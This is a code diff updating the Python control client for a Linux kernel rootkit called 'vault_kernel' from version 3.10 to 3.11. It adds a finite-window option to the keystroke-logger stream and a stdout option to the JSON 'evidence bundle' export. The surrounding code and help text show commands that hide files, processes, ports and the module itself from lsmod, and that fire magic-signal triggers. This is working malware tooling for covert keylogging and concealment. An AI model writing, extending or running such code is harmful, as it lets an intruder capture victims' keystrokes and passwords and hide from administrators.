@@ -23,10 +23,13 @@ Commands:
     magic <word>          Set magic packet trigger word
     magic-encode <word> <port>
                           Print the ready-to-run kill() trigger
-    keylog [--follow] [--timestamps] [--interval MS] [--output FILE]
-                          Read captured keystrokes (stream with --follow)
+    keylog [--follow] [--timestamps] [--interval MS] [--output FILE] [--stop-after N]
+                          Read captured keystrokes (stream with --follow;
+                          --stop-after N ends the stream after N events)
     keylog-clear          Clear the keylogger buffer
-    capture [--out FILE]  Evidence bundle: stats + hidden + keylog as JSON
+    capture [--out FILE] [--stdout]
+                          Evidence bundle: stats + hidden + keylog as JSON
+                          (--stdout ALSO prints the JSON; summary -> stderr)
     hide-module           Hide rootkit from lsmod
     unhide-module         Make rootkit visible in lsmod
     reset                 Clear ALL hidden files, PIDs and ports
@@ -49,7 +52,12 @@ import argparse
 MAGIC = 0xC0
 DEVICE_PATH = "/dev/vault_kernel"
 SYSFS_MODULE = "/sys/module/vault_kernel"
-CLIENT_VERSION = "3.10"
+CLIENT_VERSION = "3.11"
+
+# Commands that NEVER open the device: safe to run without root, no
+# non-root warning (parity with the Go deviceRequired list, v3.11).
+_NO_ROOT_REQUIRED = frozenset(
+    {"status", "version", "help", "magic-encode"})
 
 
 def _port_arg(value):
@@ -77,6 +85,22 @@ def _pid_arg(value):
     if iv < 1:
         raise argparse.ArgumentTypeError(
             f"PID must be >= 1, got {iv}")
+    return iv
+
+
+def _stop_after_arg(value):
+    """argparse type: event count for `keylog --stop-after N` (v3.11).
+    Parity with the Go parser: numeric, >= 1, so a finite capture
+    window cannot be created by accident (0/negative would silently
+    mean "never stop" or "stop before anything")."""
+    try:
+        iv = int(value)
+    except ValueError:
+        raise argparse.ArgumentTypeError(
+            f"invalid --stop-after: {value!r}")
+    if iv < 1:
+        raise argparse.ArgumentTypeError(
+            f"--stop-after must be >= 1, got {iv}")
     return iv
 
 
@@ -719,7 +743,7 @@ class VaultKernelClient:
         self._close()
 
     def keylog_read(self, follow=False, interval=None, timestamps=False,
-                    output=None):
+                    output=None, stop_after=None):
         """Read captured keystrokes; with follow=True, stream new
         keystrokes until Ctrl-C.  The module's buffer shifts left when
         full, so a suffix diff is printed while the common prefix
@@ -730,7 +754,13 @@ class VaultKernelClient:
         every event is ALSO appended to the file and flushed — the
         exact bytes printed to the terminal (timestamps included),
         created 0600 because captures may contain keystrokes; a
-        one-shot writes the buffer as one record when non-empty."""
+        one-shot writes the buffer as one record when non-empty.
+        With stop_after=N (v3.11, follow only) the stream ends cleanly
+        after the Nth emitted event — same farewell as the signals —
+        the finite-capture-window mode for scripts."""
+        if stop_after is not None and not follow:
+            raise SystemExit(
+                "[-] --stop-after requires --follow")
         if interval is None:
             interval = _interval_ms_to_seconds(KEYLOG_DEFAULT_INTERVAL_MS)
         self._open()
@@ -756,6 +786,7 @@ class VaultKernelClient:
             return sink
 
         prev = ""
+        emitted = 0
         try:
             while True:
                 buf = bytearray(4096)
@@ -783,6 +814,10 @@ class VaultKernelClient:
                         _ensure_sink().write(event + "\n")
                         sink.flush()
                     prev = cur
+                    emitted += 1
+                    if stop_after is not None and emitted >= stop_after:
+                        print("\n[*] Follow stopped")
+                        break
                 time.sleep(interval)
         except KeyboardInterrupt:
             print("\n[*] Follow stopped")
@@ -941,7 +976,7 @@ class VaultKernelClient:
         print(f"[*] Encoded PID: {encoded}")
         print(f"[*] Trigger    : kill -s {MAGIC_SIGNAL} {encoded}")
 
-    def capture(self, out=None):
+    def capture(self, out=None, to_stdout=False):
         """Evidence bundle (v3.9): read stats, the hidden list and the
         keylog buffer in one pass and emit the `capture` JSON document
         — mirrors runCapture in the Go client.  With out=PATH the file
@@ -970,7 +1005,18 @@ class VaultKernelClient:
                 time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                 os.path.isdir(SYSFS_MODULE))
             payload = json.dumps(bundle, indent=2)
-            if out:
+            if out and to_stdout:
+                # v3.11: file AND pure-JSON stdout — the one-line
+                # summary moves to stderr so `capture --out f --stdout
+                # | jq` stays a clean pipeline (parity with Go).
+                fd = os.open(out, os.O_WRONLY | os.O_CREAT | os.O_TRUNC,
+                             0o600)
+                with os.fdopen(fd, "w", encoding="utf-8") as fh:
+                    fh.write(payload + "\n")
+                print(payload)
+                print(f"[+] Evidence bundle written to {out} "
+                      f"({len(payload) + 1} bytes)", file=sys.stderr)
+            elif out:
                 fd = os.open(out, os.O_WRONLY | os.O_CREAT | os.O_TRUNC,
                              0o600)
                 with os.fdopen(fd, "w", encoding="utf-8") as fh:
@@ -1058,11 +1104,18 @@ def main():
     sp.add_argument("--output", default=None, metavar="FILE",
                     help="also append every event to FILE (created 0600, "
                          "flushed per event)")
+    sp.add_argument("--stop-after", type=_stop_after_arg, default=None,
+                    metavar="N",
+                    help="with --follow: stop cleanly after N events "
+                         "(finite capture window)")
     sp = subparsers.add_parser(
         "capture", help="Evidence bundle: stats + hidden + keylog as JSON")
     sp.add_argument("--out", default=None, metavar="FILE",
                     help="write the bundle to FILE (created 0600) "
                          "instead of stdout")
+    sp.add_argument("--stdout", action="store_true",
+                    help="with --out: ALSO print the JSON to stdout "
+                         "(the summary line moves to stderr)")
     subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
     subparsers.add_parser("version", help="Print client version and ioctl ABI")
     subparsers.add_parser("hide-module", help="Hide from lsmod")
@@ -1079,8 +1132,13 @@ def main():
         parser.print_help()
         sys.exit(1)
 
-    if os.geteuid() != 0:
-        print("[!] Warning: not running as root. Some commands may fail.")
+    # v3.11: the non-root warning only fires for commands that open the
+    # device (parity with the Go deviceRequired list) and goes to
+    # STDERR — it used to pollute STDOUT of `status --json`, breaking
+    # `| jq` for exactly the no-root workflow v3.10 created.
+    if os.geteuid() != 0 and args.command not in _NO_ROOT_REQUIRED:
+        print("[!] Warning: not running as root. Some commands may fail.",
+              file=sys.stderr)
 
     if args.command == "keylog" and args.timestamps and not args.follow:
         parser.error("--timestamps requires --follow")
@@ -1126,9 +1184,10 @@ def main():
             interval = _interval_ms_to_seconds(args.interval)
             client.keylog_read(follow=args.follow, interval=interval,
                                timestamps=args.timestamps,
-                               output=args.output)
+                               output=args.output,
+                               stop_after=args.stop_after)
         elif args.command == "capture":
-            client.capture(out=args.out)
+            client.capture(out=args.out, to_stdout=args.stdout)
         elif args.command == "keylog-clear":
             client.keylog_clear()
         elif args.command == "hide-module":
